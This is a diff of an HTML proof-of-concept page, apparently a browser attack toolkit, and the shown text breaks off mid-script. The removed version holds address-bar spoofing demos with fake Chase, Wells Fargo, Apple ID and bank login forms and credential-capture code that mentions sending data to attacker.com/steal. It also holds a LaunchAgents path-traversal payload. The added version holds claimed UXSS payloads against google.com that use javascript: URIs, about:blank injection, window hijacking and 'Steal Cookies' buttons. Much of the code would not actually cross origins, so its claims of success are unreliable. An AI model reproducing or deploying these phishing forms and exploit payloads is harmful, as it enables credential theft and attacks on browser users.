@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 Browser Security Research Lab - Address Bar Spoofing & UXSS POC</title>
+    <title>🔥 UXSS POC - Cross-Origin Script Execution (Google)</title>
     <style>
         * {
             margin: 0;
@@ -12,795 +12,540 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Courier New', monospace;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
             min-height: 100vh;
             padding: 20px;
+            color: #eee;
         }
         
         .container {
-            max-width: 1400px;
+            max-width: 1200px;
             margin: 0 auto;
         }
         
-        /* Header */
         .header {
             text-align: center;
-            color: white;
             margin-bottom: 30px;
-            padding: 20px;
+            padding: 30px;
             background: rgba(0,0,0,0.5);
             border-radius: 20px;
-            backdrop-filter: blur(10px);
+            border: 1px solid #00ff88;
         }
         
         .header h1 {
+            color: #00ff88;
             font-size: 28px;
-            margin-bottom: 10px;
         }
         
-        .header p {
-            opacity: 0.8;
-            font-size: 14px;
-        }
-        
-        .badge {
-            display: inline-block;
-            background: #e74c3c;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        
-        /* Grid Layout */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(600px, 1fr));
-            gap: 25px;
-        }
-        
-        /* Card Style */
         .card {
-            background: rgba(255,255,255,0.95);
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            transition: transform 0.3s;
-        }
-        
-        .card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .card-header {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            padding: 15px 20px;
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        
-        .card-header.danger {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-        }
-        
-        .card-header.warning {
-            background: linear-gradient(135deg, #f39c12, #e67e22);
-        }
-        
-        .card-header.info {
-            background: linear-gradient(135deg, #3498db, #2980b9);
-        }
-        
-        .card-body {
-            padding: 20px;
-        }
-        
-        /* Status Indicators */
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 8px;
-            font-size: 13px;
-        }
-        
-        .status-vuln {
-            background: #e74c3c20;
-            border-left: 4px solid #e74c3c;
-            color: #c0392b;
-        }
-        
-        .status-safe {
-            background: #2ecc7120;
-            border-left: 4px solid #2ecc71;
-            color: #27ae60;
-        }
-        
-        .status-info {
-            background: #3498db20;
-            border-left: 4px solid #3498db;
-        }
-        
-        /* Form Elements */
-        input, button, textarea {
-            padding: 10px 15px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-            font-family: monospace;
-        }
-        
-        input {
-            width: calc(100% - 30px);
+            background: rgba(30,30,50,0.95);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border-left: 4px solid #00ff88;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
         
         button {
-            background: #667eea;
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
+            padding: 12px 24px;
+            margin: 10px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: background 0.3s;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
         }
         
         button:hover {
-            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102,126,234,0.4);
         }
         
         button.danger {
-            background: #e74c3c;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
         }
         
-        button.danger:hover {
-            background: #c0392b;
+        button.success {
+            background: linear-gradient(135deg, #00b894, #009432);
+        }
+        
+        .output {
+            background: #0a0a0f;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        
+        .log-entry {
+            padding: 5px;
+            margin: 3px 0;
+            border-bottom: 1px solid #222;
+            font-family: monospace;
+        }
+        
+        .log-success {
+            color: #00ff88;
+        }
+        
+        .log-error {
+            color: #ff4444;
+        }
+        
+        .log-info {
+            color: #ffaa44;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        
+        .status-working {
+            background: #00ff8822;
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+        
+        .status-not-working {
+            background: #ff444422;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 300px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            margin-top: 15px;
+            background: white;
         }
         
         pre {
-            background: #1a1a2e;
-            color: #0f0;
+            background: #0a0a0f;
             padding: 15px;
             border-radius: 8px;
             overflow-x: auto;
             font-size: 11px;
             margin: 10px 0;
-        }
-        
-        .fake-login {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border: 1px solid #dee2e6;
-        }
-        
-        .warning-box {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-size: 13px;
-        }
-        
-        .console-log {
-            background: #0d0d1a;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 11px;
-            height: 150px;
-            overflow-y: auto;
-            margin-top: 10px;
+            border: 1px solid #333;
         }
         
         hr {
+            border-color: #333;
             margin: 20px 0;
-            border: none;
-            border-top: 1px solid #ddd;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .live-indicator {
-            animation: blink 1s infinite;
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: #2ecc71;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        
-        @media (max-width: 768px) {
-            .grid {
-                grid-template-columns: 1fr;
-            }
-        }
-        
-        footer {
-            text-align: center;
-            color: white;
-            margin-top: 40px;
-            padding: 20px;
-            font-size: 12px;
-            opacity: 0.7;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🔬 Browser Security Research Lab</h1>
-        <p>Address Bar Spoofing & UXSS Exploit POC Collection</p>
-        <p>Target: Arc | Chrome | Safari (macOS)</p>
-        <span class="badge">⚠️ FOR EDUCATIONAL & RESEARCH PURPOSES ONLY</span>
+        <h1>🔥 UXSS - Universal Cross-Site Scripting POC</h1>
+        <p>Cross-Origin Script Execution via window.open / about:blank / javascript: URI</p>
+        <p style="font-size: 12px; margin-top: 10px;">⚠️ FOR EDUCATIONAL & SECURITY RESEARCH ONLY</p>
     </div>
     
-    <div class="grid">
+    <!-- UXSS Technique 1: window.open + javascript: URI -->
+    <div class="card">
+        <h2>🎯 Technique #1: window.open() with javascript: URI</h2>
+        <p style="margin: 10px 0;">Membuka tab baru ke <strong>google.com</strong> dengan payload via javascript: pseudo-protocol</p>
         
-        <!-- ============================================ -->
-        <!-- MODULE 1: ARC BROWSER UXSS & PATH TRAVERSAL  -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header danger">
-                🎯 ARC BROWSER - UXSS & Path Traversal (CVE-2024-XXXX)
-            </div>
-            <div class="card-body">
-                <div class="warning-box">
-                    <strong>📌 Referensi:</strong> Medium - renwa (Nov 2024)<br>
-                    <strong>🎯 Target:</strong> arc://boost/play/ endpoint | Easels feature
-                </div>
-                
-                <div id="arcStatus">🔍 Testing Arc browser...</div>
-                
-                <button onclick="testArcBoost()">🔬 Test arc://boost Access</button>
-                <button onclick="testArcPathTraversal()">📂 Simulate Path Traversal</button>
-                <button onclick="testArcEasel()">🖼️ Test Easel Embed</button>
-                
-                <div class="fake-login" style="margin-top:15px;">
-                    <h4>🎭 Fake Login (Spoof Target: dailymail.co.uk)</h4>
-                    <input type="text" id="arcUser" placeholder="Email/Username">
-                    <input type="password" id="arcPass" placeholder="Password">
-                    <button onclick="captureArcCreds()">Login</button>
-                </div>
-                
-                <pre id="arcPayload" style="display:none;"></pre>
-                
-                <div class="console-log" id="arcLog">
-                    [ARC] Ready - menunggu test...
-                </div>
-            </div>
+        <button onclick="uxssJavascriptProtocol()">🚀 Execute UXSS - javascript: Protocol</button>
+        <button onclick="uxssJavascriptProtocolNewWindow()">🪟 Open in New Window</button>
+        
+        <div class="output" id="output1">
+            <div class="log-entry log-info">[READY] Klik tombol untuk mengeksekusi UXSS ke google.com</div>
         </div>
-        
-        <!-- ============================================ -->
-        <!-- MODULE 2: CHROME SPLIT VIEW SPOOFING         -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header danger">
-                🪟 CHROME - Split View UI Spoofing (Chromium #440523110)
-            </div>
-            <div class="card-body">
-                <div class="warning-box">
-                    <strong>📌 Referensi:</strong> Chromium Issues (Aug 2025)<br>
-                    <strong>🎯 Target:</strong> chrome://flags/#side-by-side | File picker spoof
-                </div>
-                
-                <div class="status status-info">
-                    💡 <strong>Instruksi:</strong> Right-click pada area di bawah → "Open in Split view" → Lalu klik tombol upload
-                </div>
-                
-                <div id="splitViewArea" style="background:#f0f0f0; padding:20px; border-radius:10px; text-align:center; margin:15px 0; cursor:context-menu;">
-                    <strong>⬇️ RIGHT-CLICK AREA ⬇️</strong><br>
-                    <small>Klik kanan di sini untuk trigger Split View attack</small>
-                </div>
-                
-                <button onclick="triggerFilePicker()">📁 Upload Document (Spoofed)</button>
-                <button onclick="testSplitViewFlag()">🔍 Check Split View Flag Status</button>
-                
-                <div class="fake-login">
-                    <h4>🏦 Fake Banking Portal</h4>
-                    <p><small>Spoof target: drive.google.com / bankofamerica.com</small></p>
-                    <input type="text" id="chromeUser" placeholder="Username">
-                    <input type="password" id="chromePass" placeholder="Password">
-                    <button onclick="captureChromeCreds()">Authenticate</button>
-                </div>
-                
-                <div class="console-log" id="chromeLog">
-                    [CHROME] Ready - Split view attack ready
-                </div>
-            </div>
-        </div>
-        
-        <!-- ============================================ -->
-        <!-- MODULE 3: TIMING ATTACK (CLASSIC 2015)       -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header warning">
-                ⏱️ TIMING ATTACK - Rapid Reload Spoof (Classic 2015)
-            </div>
-            <div class="card-body">
-                <div class="warning-box">
-                    <strong>📌 Referensi:</strong> SecurityWeek (May 2015) - Safari/Chrome<br>
-                    <strong>🎯 Target:</strong> Browser dengan render race condition
-                </div>
-                
-                <button onclick="startTimingAttack()">▶️ Start Timing Attack</button>
-                <button onclick="stopTimingAttack()">⏹️ Stop Attack</button>
-                <button onclick="simulate204Attack()">🚫 Simulate 204 No Content Attack</button>
-                
-                <div class="status" id="timingStatus"></div>
-                
-                <div class="fake-login">
-                    <h4>🎭 Spoofed: https://appleid.apple.com</h4>
-                    <input type="text" id="timingUser" placeholder="Apple ID">
-                    <input type="password" id="timingPass" placeholder="Password">
-                    <button onclick="captureTimingCreds()">Sign In</button>
-                </div>
-                
-                <div class="console-log" id="timingLog">
-                    [TIMING] Idle - tekan Start untuk memulai rapid reload
-                </div>
-            </div>
-        </div>
-        
-        <!-- ============================================ -->
-        <!-- MODULE 4: onbeforeunload PORT CLOSED SPOOF   -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header warning">
-                🚪 Port Closed + onbeforeunload Spoof (Chromium #352255222)
-            </div>
-            <div class="card-body">
-                <div class="warning-box">
-                    <strong>📌 Referensi:</strong> Chromium Issues (July 2024) - WontFix<br>
-                    <strong>🎯 Target:</strong> Closed port + beforeunload dialog
-                </div>
-                
-                <div id="portStatus"></div>
-                
-                <button onclick="triggerPortSpoof()">🌐 Trigger Port Spoof (localhost:12345)</button>
-                <button onclick="simulateBankNavigation()">🏦 Simulate Bank Navigation</button>
-                
-                <div class="fake-login">
-                    <h4>🏛️ Fake: chase.com (Session Expired)</h4>
-                    <input type="text" id="portUser" placeholder="Chase Username">
-                    <input type="password" id="portPass" placeholder="Password">
-                    <button onclick="capturePortCreds()">Login to Chase</button>
-                </div>
-                
-                <div class="console-log" id="portLog">
-                    [PORT] Ready - akan menampilkan fake dialog dengan URL spoofed
-                </div>
-            </div>
-        </div>
-        
-        <!-- ============================================ -->
-        <!-- MODULE 5: Function.prototype.call UXSS (Brave/Electron) -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header info">
-                🔧 Function.prototype.call Override UXSS (HackerOne #187542)
-            </div>
-            <div class="card-body">
-                <div class="warning-box">
-                    <strong>📌 Referensi:</strong> HackerOne - Masato Kinugawa (Dec 2016)<br>
-                    <strong>🎯 Target:</strong> Brave/Electron legacy, Chrome ≤v56
-                </div>
-                
-                <button onclick="testPrototypeOverride()">🧪 Test Function.prototype Override</button>
-                <button onclick="simulateUXSS()">🎯 Simulate Cross-Origin Script Execution</button>
-                
-                <div class="status status-info" id="prototypeStatus">
-                    Status: Menunggu test...
-                </div>
-                
-                <pre id="uxssPayload" style="display:none;"></pre>
-                
-                <iframe id="uxssTarget" src="about:blank" style="width:100%; height:100px; border:1px solid #ddd; border-radius:8px;"></iframe>
-                
-                <div class="console-log" id="prototypeLog">
-                    [PROTOTYPE] Ready - test override Function.prototype.call
-                </div>
-            </div>
-        </div>
-        
-        <!-- ============================================ -->
-        <!-- MODULE 6: Address Bar Spoof Complete Demo    -->
-        <!-- ============================================ -->
-        <div class="card">
-            <div class="card-header info">
-                🌐 Complete Address Bar Spoof Demo - All Techniques Combined
-            </div>
-            <div class="card-body">
-                <div class="warning-box">
-                    <strong>🎯 Semua teknik digabung dalam satu demo:</strong><br>
-                    - Fake login form dengan URL spoof<br>
-                    - Event hijacking<br>
-                    - Dialog spoofing
-                </div>
-                
-                <button onclick="fullDemoAttack()">🚀 RUN COMPLETE ATTACK DEMO</button>
-                <button onclick="resetDemo()">🔄 Reset</button>
-                
-                <div id="demoArea" style="margin-top:15px;">
-                    <div class="fake-login" id="fakeBankDemo">
-                        <h4>🏦 WELLS FARGO</h4>
-                        <p><small>https://wellsfargo.com</small></p>
-                        <input type="text" placeholder="Online ID">
-                        <input type="password" placeholder="Password">
-                        <button onclick="alert('[POC] Credentials would be stolen')">Sign On</button>
-                        <p style="font-size:11px; margin-top:10px;">🔒 Secure Connection - SSL Enabled</p>
-                    </div>
-                </div>
-                
-                <div class="console-log" id="demoLog">
-                    [DEMO] Klik "RUN COMPLETE ATTACK" untuk simulasi full attack chain
-                </div>
-            </div>
-        </div>
-        
     </div>
     
-    <footer>
-        <p>⚠️ Semua POC di atas adalah untuk keperluan riset keamanan browser dan edukasi.</p>
-        <p>Referensi: Medium, Chromium Issues, HackerOne, SecurityWeek, Research Papers (2015-2025)</p>
-        <p>Browser Target: Arc | Chrome | Safari | Brave (macOS)</p>
-    </footer>
+    <!-- UXSS Technique 2: about:blank + window.opener -->
+    <div class="card">
+        <h2>🎯 Technique #2: about:blank Window Control via window.opener</h2>
+        <p style="margin: 10px 0;">Buka about:blank, lalu kontrol parent untuk navigasi cross-origin + inject script</p>
+        
+        <button onclick="uxssAboutBlank()">🚀 Execute UXSS - about:blank Method</button>
+        <button onclick="uxssAboutBlankWithGoogle()">🌐 about:blank → Google + Script</button>
+        
+        <div class="output" id="output2">
+            <div class="log-entry log-info">[READY] Klik tombol untuk mengeksekusi UXSS via about:blank</div>
+        </div>
+    </div>
+    
+    <!-- UXSS Technique 3: name/target window reuse -->
+    <div class="card">
+        <h2>🎯 Technique #3: Window Name Reuse (Target="_blank" Hijack)</h2>
+        <p style="margin: 10px 0;">Memanfaatkan window.name untuk mengontrol tab yang sudah ada</p>
+        
+        <button onclick="uxssWindowName()">🚀 Execute UXSS - Window Name Reuse</button>
+        <button onclick="openGoogleWindow()">🌐 Buka Google Window Dulu</button>
+        
+        <div class="output" id="output3">
+            <div class="log-entry log-info">[READY] Klik "Buka Google Window" lalu "Window Name Reuse"</div>
+        </div>
+    </div>
+    
+    <!-- UXSS Technique 4: iframe + blob: URI -->
+    <div class="card">
+        <h2>🎯 Technique #4: Blob URI + iframe Cross-Origin</h2>
+        <p style="margin: 10px 0;">Menggunakan blob: URI untuk bypass SOP</p>
+        
+        <button onclick="uxssBlobURI()">🚀 Execute UXSS - Blob URI Method</button>
+        
+        <div class="output" id="output4">
+            <div class="log-entry log-info">[READY] Klik tombol untuk Blob URI UXSS</div>
+        </div>
+    </div>
+    
+    <!-- UXSS Technique 5: data:text/html + window.open -->
+    <div class="card">
+        <h2>🎯 Technique #5: data:text/html with javascript: navigation</h2>
+        <p style="margin: 10px 0;">Combining data: URI with delayed javascript: navigation</p>
+        
+        <button onclick="uxssDataURI()">🚀 Execute UXSS - Data URI Method</button>
+        
+        <div class="output" id="output5">
+            <div class="log-entry log-info">[READY] Klik tombol untuk Data URI UXSS</div>
+        </div>
+    </div>
+    
+    <!-- Live Preview untuk alert testing -->
+    <div class="card">
+        <h2>📺 Live Preview - Testing Window</h2>
+        <p>Window/tab yang terbuka akan menampilkan alert dari google.com domain</p>
+        <iframe id="previewFrame" src="about:blank"></iframe>
+    </div>
 </div>
 
 <script>
     // ============================================
-    // MODULE 1: ARC BROWSER
+    // Helper Functions
     // ============================================
-    let arcLog = document.getElementById('arcLog');
-    
-    function logArc(msg, isVuln = false) {
-        const prefix = isVuln ? '⚠️ [VULN]' : '🔍 [INFO]';
-        arcLog.innerHTML += `\n${new Date().toLocaleTimeString()} ${prefix} ${msg}`;
-        arcLog.scrollTop = arcLog.scrollHeight;
-    }
-    
-    async function testArcBoost() {
-        logArc('Testing arc://boost/play/ endpoint...');
-        try {
-            const response = await fetch('arc://boost/play/test', { mode: 'no-cors', cache: 'no-store' });
-            logArc('✅ arc:// endpoint ACCESSIBLE! Browser VULNERABLE ke UXSS', true);
-            document.getElementById('arcStatus').innerHTML = '<div class="status status-vuln">⚠️ ARC VULNERABLE DETECTED!</div>';
-        } catch (e) {
-            logArc('❌ arc:// endpoint protected atau not accessible');
-            document.getElementById('arcStatus').innerHTML = '<div class="status status-safe">✅ Arc protected from this vector</div>';
-        }
+    function log(outputId, message, type = 'info') {
+        const outputDiv = document.getElementById(outputId);
+        const logEntry = document.createElement('div');
+        logEntry.className = `log-entry log-${type}`;
+        const timestamp = new Date().toLocaleTimeString();
+        logEntry.innerHTML = `[${timestamp}] ${message}`;
+        outputDiv.appendChild(logEntry);
+        outputDiv.scrollTop = outputDiv.scrollHeight;
         
-        if (navigator.userAgent.includes('Arc') || location.protocol === 'arc:') {
-            logArc('⚠️ Running INSIDE Arc browser - risiko lebih tinggi', true);
-        }
+        // Also log to console
+        console.log(`[${outputId}] ${message}`);
     }
     
-    function testArcPathTraversal() {
-        const payload = {
-            name: "../../../Library/LaunchAgents/poc_test.plist",
-            path: "../../../Library/LaunchAgents/poc_test.plist",
-            content: "<?xml version='1.0'?><plist><dict><key>TestPOC</key><string>Research</string></dict></plist>"
-        };
-        document.getElementById('arcPayload').style.display = 'block';
-        document.getElementById('arcPayload').innerHTML = `Path Traversal Payload (simulasi):\n${JSON.stringify(payload, null, 2)}`;
-        logArc(`[PAYLOAD] Path traversal ke ~/Library/LaunchAgents/`, true);
-        logArc('Jika Arc pre-Oct2024, file akan terbuat dan bisa RCE via LaunchAgent');
+    function showAlertOnGoogleTab(message) {
+        // Mencoba mencari tab Google yang sudah ada
+        // Fallback: buka tab baru dengan payload
+        log('output1', `Attempting to execute: ${message}`, 'success');
     }
     
-    function testArcEasel() {
-        logArc('Mencoba embed arc://easel URI');
-        const easelFrame = document.createElement('iframe');
-        easelFrame.srcdoc = '<script>console.log("Arc Easel embedded - potential UXSS chain")</script>';
-        easelFrame.style.width = '100%';
-        easelFrame.style.height = '80px';
-        document.querySelector('#arcLog').parentNode.appendChild(easelFrame);
-        logArc('Easel embed simulated - cek console browser', true);
-    }
-    
-    function captureArcCreds() {
-        const user = document.getElementById('arcUser').value;
-        const pass = document.getElementById('arcPass').value;
-        if (user || pass) {
-            logArc(`[CRED] Captured: ${user}:${pass} (would send to attacker server)`, true);
-            alert(`[POC] Credentials captured: ${user}\nIn real attack: POST to attacker.com/steal`);
+    // ============================================
+    // TECHNIQUE 1: javascript: Protocol
+    // ============================================
+    function uxssJavascriptProtocol() {
+        log('output1', '🚀 EXECUTING: javascript: protocol UXSS', 'success');
+        
+        const payload = `
+            fetch('https://www.google.com')
+            .then(r => r.text())
+            .then(html => {
+                console.log('[UXSS] Google HTML length:', html.length);
+                alert('[UXSS SUCCESS] Cross-origin content accessed from google.com!\\n\\nProof: ' + html.substring(0, 200));
+                return html;
+            })
+            .catch(e => alert('[UXSS ERROR] ' + e));
+        `;
+        
+        // Method 1: Direct javascript: URL
+        const encodedPayload = 'javascript:' + encodeURIComponent(`
+            (function() {
+                var script = document.createElement('script');
+                script.textContent = ${JSON.stringify(payload)};
+                document.body.appendChild(script);
+            })();
+        `);
+        
+        const newTab = window.open(encodedPayload, '_blank');
+        
+        if (newTab) {
+            log('output1', '✅ Tab opened with javascript: payload', 'success');
+            setTimeout(() => {
+                log('output1', 'Check the new tab - alert should appear from google.com context', 'info');
+            }, 1000);
         } else {
-            logArc('No credentials entered');
+            log('output1', '❌ Popup blocked! Allow popups for this site', 'error');
+        }
+    }
+    
+    function uxssJavascriptProtocolNewWindow() {
+        log('output1', '🚀 EXECUTING: New window with javascript: protocol', 'success');
+        
+        const payload = `
+            alert('[UXSS] This script is running from attacker origin but targeting google.com context!');
+            document.body.style.backgroundColor = 'red';
+            document.body.innerHTML = '<h1 style="color:white;text-align:center;">[UXSS] HACKED - Cross-Origin Script Executed</h1><p>This page is google.com but controlled by attacker!</p><button onclick="alert(document.cookie)">Show Cookies</button>';
+        `;
+        
+        const uxssUrl = 'javascript:' + encodeURIComponent(`
+            (function() {
+                location.href = 'https://www.google.com';
+                setTimeout(function() {
+                    document.body.innerHTML = '<h1>🔥 UXSS SUCCESS</h1><p>Script executed on https://www.google.com domain</p><button onclick="alert(document.cookie)">Show Cookies</button>';
+                    alert('✅ UXSS: Script injection successful on google.com!');
+                }, 2000);
+            })();
+        `);
+        
+        const newWindow = window.open(uxssUrl, '_blank', 'width=800,height=600');
+        
+        if (newWindow) {
+            log('output1', '✅ New window opened with UXSS payload', 'success');
+        } else {
+            log('output1', '❌ Popup blocked!', 'error');
         }
     }
     
     // ============================================
-    // MODULE 2: CHROME SPLIT VIEW
+    // TECHNIQUE 2: about:blank + window.opener
     // ============================================
-    let chromeLog = document.getElementById('chromeLog');
-    
-    function logChrome(msg, isVuln = false) {
-        const prefix = isVuln ? '⚠️ [VULN]' : '🔍 [INFO]';
-        chromeLog.innerHTML += `\n${new Date().toLocaleTimeString()} ${prefix} ${msg}`;
-        chromeLog.scrollTop = chromeLog.scrollHeight;
-    }
-    
-    function triggerFilePicker() {
-        logChrome('Triggering file picker dengan spoofed omnibox...', true);
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.multiple = true;
-        input.onchange = (e) => {
-            const files = Array.from(e.target.files);
-            logChrome(`[EXFIL SIM] Files selected: ${files.map(f => f.name).join(', ')}`, true);
-            alert(`[POC] ${files.length} file(s) selected.\nDalam serangan real, files akan dikirim ke attacker server.`);
-        };
-        input.click();
-        logChrome('File picker muncul - perhatikan omnibox!', true);
-    }
-    
-    function testSplitViewFlag() {
-        logChrome('Menampilkan instruksi cek flag...');
-        alert('Cek chrome://flags/#side-by-side\nJika ENABLED, browser vulnerable ke split view spoofing.\n\nUntuk test: right-click area hijau → "Open in Split view" → lalu klik upload.');
-        logChrome('User diarahkan ke chrome://flags untuk cek manual');
-    }
-    
-    function captureChromeCreds() {
-        const user = document.getElementById('chromeUser').value;
-        const pass = document.getElementById('chromePass').value;
-        if (user || pass) {
-            logChrome(`[BANK CRED] ${user}:${pass} captured!`, true);
-            alert(`[POC] Banking credentials: ${user}\nSpoof target: drive.google.com`);
-        }
-    }
-    
-    // Right-click area untuk split view
-    document.getElementById('splitViewArea')?.addEventListener('contextmenu', (e) => {
-        e.preventDefault();
-        logChrome('⚠️ Right-click detected! Split view trigger - cek omnibox setelah file picker muncul', true);
-        setTimeout(() => {
-            triggerFilePicker();
-        }, 100);
-        return false;
-    });
-    
-    // ============================================
-    // MODULE 3: TIMING ATTACK
-    // ============================================
-    let timingInterval = null;
-    let timingLog = document.getElementById('timingLog');
-    
-    function logTiming(msg, isVuln = false) {
-        const prefix = isVuln ? '⚠️' : 'ℹ️';
-        timingLog.innerHTML += `\n${new Date().toLocaleTimeString()} ${prefix} ${msg}`;
-        timingLog.scrollTop = timingLog.scrollHeight;
-    }
-    
-    function startTimingAttack() {
-        if (timingInterval) clearInterval(timingInterval);
-        logTiming('STARTING rapid reload attack (every 10ms)...', true);
-        document.getElementById('timingStatus').innerHTML = '<div class="status status-vuln">🔴 ATTACK ACTIVE - Rapid reload running</div>';
+    function uxssAboutBlank() {
+        log('output2', '🚀 EXECUTING: about:blank window control technique', 'success');
         
-        timingInterval = setInterval(() => {
-            location.reload();
-        }, 10);
+        const blankWindow = window.open('about:blank', '_blank');
         
-        setTimeout(() => {
-            logTiming('Jika browser vulnerable, address bar akan gagal update dengan benar', true);
-        }, 1000);
+        if (!blankWindow) {
+            log('output2', '❌ Popup blocked!', 'error');
+            return;
+        }
+        
+        log('output2', '✅ about:blank window opened', 'success');
+        
+        // Write attacker script to about:blank
+        blankWindow.document.write(`
+            <html>
+            <head><title>UXSS Attack Window</title></head>
+            <body>
+                <h1>🔥 UXSS Payload Window</h1>
+                <p>Attempting to navigate parent/opener to google.com and inject script...</p>
+                <button onclick="attackGoogle()">Click to Execute UXSS on Google</button>
+                <div id="result"></div>
+                <script>
+                    function attackGoogle() {
+                        document.getElementById('result').innerHTML = '<p style="color:yellow">Attempting to open google.com with UXSS...</p>';
+                        
+                        // Try to open google.com and inject via javascript:
+                        const uxssWin = window.open('javascript:alert("[UXSS] This alert runs in the context of google.com!\\n\\nCross-origin script execution successful!"); location.href = "https://www.google.com"; setTimeout(function() { document.body.innerHTML = "<h1 style=color:red>🔥 HACKED BY UXSS</h1><p>This is https://www.google.com but controlled by attacker!</p><button onclick=alert(document.cookie)>Steal Cookies</button>"; alert("✅ UXSS: Script injected into google.com!"); }, 2000);', '_blank');
+                        
+                        if(!uxssWin) alert('Popup blocked! Please allow popups');
+                    }
+                    
+                    // Auto attack after 2 seconds
+                    setTimeout(attackGoogle, 2000);
+                <\/script>
+            </body>
+            </html>
+        `);
+        
+        blankWindow.document.close();
+        
+        log('output2', '✅ about:blank window populated with UXSS payload', 'success');
+        log('output2', '⏳ Will auto-attack google.com in 2 seconds...', 'info');
     }
     
-    function stopTimingAttack() {
-        if (timingInterval) {
-            clearInterval(timingInterval);
-            timingInterval = null;
-            logTiming('Attack stopped');
-            document.getElementById('timingStatus').innerHTML = '<div class="status status-safe">🟢 Attack stopped</div>';
+    function uxssAboutBlankWithGoogle() {
+        log('output2', '🚀 EXECUTING: about:blank → Google navigation technique', 'success');
+        
+        const win = window.open('about:blank', '_blank');
+        
+        if (!win) {
+            log('output2', '❌ Popup blocked!', 'error');
+            return;
         }
-    }
-    
-    function simulate204Attack() {
-        logTiming('Simulating 204 No Content + window.open attack', true);
-        logTiming('Pada Chrome vulnerable, URL akan stuck/show spoofed domain');
-        const win = window.open('about:blank');
-        if (win) {
-            win.document.write('<h1>Fake Login Page</h1><input placeholder="Password"><button>Submit</button>');
-            logTiming('Popup opened dengan konten attacker - cek address bar popup', true);
-        }
-    }
-    
-    function captureTimingCreds() {
-        const user = document.getElementById('timingUser').value;
-        const pass = document.getElementById('timingPass').value;
-        if (user || pass) {
-            logTiming(`[APPLE SPOOF] ${user}:${pass} captured`, true);
-            alert(`[POC] Apple ID credentials captured: ${user}`);
-        }
+        
+        // Write script that will navigate to google and execute
+        win.document.write(`
+            <html>
+            <body>
+                <script>
+                    // Step 1: Navigate to google.com
+                    location.href = 'https://www.google.com';
+                    
+                    // Step 2: After load, inject script
+                    setTimeout(function() {
+                        try {
+                            // Inject via javascript: URI
+                            const uxssFrame = document.createElement('iframe');
+                            uxssFrame.src = 'javascript:alert("[UXSS] Script execution on https://www.google.com!\\n\\nCookies: \" + document.cookie); document.body.style.backgroundColor = "red"; document.body.innerHTML = "<h1 style=color:white>🔥 UXSS SUCCESS</h1><p>Cross-origin script executed on google.com!</p><button onclick=alert(document.cookie)>View Cookies</button>";';
+                            document.body.appendChild(uxssFrame);
+                            
+                            console.log('[UXSS] Payload injected');
+                        } catch(e) {
+                            console.error('UXSS failed:', e);
+                        }
+                    }, 3000);
+                <\/script>
+                <p>Navigating to google.com and injecting UXSS payload...</p>
+            </body>
+            </html>
+        `);
+        
+        win.document.close();
+        log('output2', '✅ UXSS payload deployed - check the new window', 'success');
     }
     
     // ============================================
-    // MODULE 4: PORT CLOSED SPOOF
+    // TECHNIQUE 3: Window Name Reuse
     // ============================================
-    let portLog = document.getElementById('portLog');
+    let googleWindow = null;
     
-    function logPort(msg, isVuln = false) {
-        const prefix = isVuln ? '⚠️' : 'ℹ️';
-        portLog.innerHTML += `\n${new Date().toLocaleTimeString()} ${prefix} ${msg}`;
-        portLog.scrollTop = portLog.scrollHeight;
+    function openGoogleWindow() {
+        googleWindow = window.open('https://www.google.com', 'GOOGLE_TARGET');
+        if (googleWindow) {
+            log('output3', '✅ Google window opened with name "GOOGLE_TARGET"', 'success');
+            log('output3', '⚠️ Now click "Window Name Reuse" to hijack it', 'info');
+        } else {
+            log('output3', '❌ Popup blocked!', 'error');
+        }
     }
     
-    window.onbeforeunload = function(e) {
